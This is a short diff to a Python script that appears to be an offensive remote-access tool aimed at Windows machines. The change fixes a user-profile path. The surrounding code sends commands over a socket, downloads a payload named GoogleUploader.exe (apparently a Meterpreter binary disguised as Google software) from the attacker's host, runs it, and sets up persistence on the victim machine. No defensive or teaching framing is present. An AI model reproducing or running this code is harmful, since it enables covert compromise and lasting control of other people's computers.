@@ -126,7 +126,7 @@ def download_file(s, link, filename):
     s.send(d)
     print(recv_a(s))
     p("\x1b[1;36m[+]\x1b[0m File downloaded.")
-def exe_file(s, filename, filepath="%HOMEPATH%erProfile%\Documents\\"): 
+def exe_file(s, filename, filepath="%UserProfile%\Documents\\"): 
     p("\x1b[1;36m[+]\x1b[0m Executing file.")
     d = '& \'.\\' + filepath + filename + "'\n"
     s.send(d)
@@ -163,7 +163,7 @@ def run_meter(s, filename, lport=9091, lhost=HOST, httpport=8080):
     download_file(s, f"http://{lhost}:{httpport}/GoogleUploader.exe", filename)
     exe_file(s, filename)
     p("\x1b[1;36m[+]\x1b[0m Done.")
-    presistence("%HOMEPATH%erProfile%\Documents\\"+filename)
+    presistence("%UserProfile%\Documents\\"+filename)
 
 
 def hide_cmd(s):
